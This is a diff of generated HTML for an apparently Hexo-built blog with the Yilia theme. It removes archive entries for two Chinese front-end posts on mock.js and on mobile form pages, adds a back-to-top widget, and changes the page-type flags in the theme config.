+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/10/29/mock.js实现前端独立开发/">mock.js实现前端独立开发</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">框架</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/技术探索//" class="article-tag-list-link color5">技术探索</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/10/24/小程序选项卡思维迁移实现多信息填写单页面/" class="archive-article-date">
-  	<time datetime="2017-10-23T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/10/24/小程序选项卡思维迁移实现多信息填写单页面/">移动端单页面填写多信息方法</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">手机页面</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/技术总结//" class="article-tag-list-link color5">技术总结</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -349,9 +580,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
